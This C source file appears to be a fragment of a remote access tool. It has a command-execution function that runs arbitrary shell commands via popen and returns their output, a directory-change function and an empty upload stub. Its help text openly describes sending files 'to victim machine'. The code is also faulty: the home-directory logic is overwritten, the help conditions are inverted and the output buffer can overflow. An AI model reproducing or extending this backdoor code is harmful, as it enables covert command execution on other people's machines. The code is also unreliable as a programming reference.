#include "include.h"


/* Client commands */
int cd(char *path){
    int output;
    char *username;
    char *new_path;

    if(strcmp(path, "home") == 0){
        username = getlogin();
        new_path = (char *)malloc(sizeof(char) * strlen(username) + 9);
        strcpy(new_path, "/home/");
        strcat(new_path, username);
    }
    new_path = path;
    output = chdir(new_path);
    return output;
}

void upload(char *path){

}

char * execute(char * command){
    FILE *fpipe;
    char line[256];
    char *output;
    
    output = (char *)malloc(sizeof(char) * 50000);
    memset(output, 0, 50000);

    if (!(fpipe = (FILE*)popen(command,"r"))){
        error("Pipe error");
    }

    while ( fgets( line, 256, fpipe)){
        strcat(output, line);
    }
    pclose(fpipe);
    return output;
}


/* Server functions */
void help(char * command){
    
    if(strcmp(command, "default")){
        printf("Commands: \n");
        printf("Upload\nHelp");

    }
    else if(strcmp(command, "help") == 0){
        printf("This command display information about other commands\n");
        printf("Usage:\nhelp <command>");
    }
    else if(strcmp(command, "upload")){
        printf("Upload command is used to send file to victim machine\n");
        printf("Usage:\nupload <path/to/file>");
    }
}